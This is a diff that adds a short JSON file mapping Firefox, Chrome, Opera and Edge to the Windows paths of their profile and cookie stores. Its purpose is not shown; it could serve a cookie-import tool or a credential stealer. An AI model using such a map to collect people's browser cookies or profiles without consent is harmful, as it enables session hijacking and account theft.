@@ -1,0 +1,6 @@
+{
+    "firefox": "%s/AppData/Roaming/Mozilla/Firefox/Profiles",
+    "chrome": "%s/AppData/Local/Google/Chrome/User Data/Default",
+    "opera": "%s/AppData/Roaming/Opera/Opera/cookies4.dat",
+    "edge": "%s/AppData/Local/Microsoft/Edge/User Data/Default/Network"
+}
